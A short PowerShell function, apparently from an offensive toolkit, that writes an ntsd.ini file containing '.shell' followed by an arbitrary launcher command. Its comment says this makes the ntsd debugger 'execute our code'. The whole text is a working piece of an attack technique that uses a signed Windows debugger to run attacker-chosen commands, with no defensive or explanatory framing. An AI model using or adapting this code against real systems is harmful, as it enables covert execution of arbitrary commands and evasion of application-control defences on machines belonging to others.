
Function Write-Ini([string]$path, [string]$launcher)
{
	# -Encoding ASCII is needed otherwise it will write in unicode
	# this will cause ntsd to not execute our code
	".shell" | Out-File -Encoding ASCII "$path\ntsd.ini"
	"$launcher" | Out-File -Encoding ASCII "$path\ntsd.ini" -Append
}
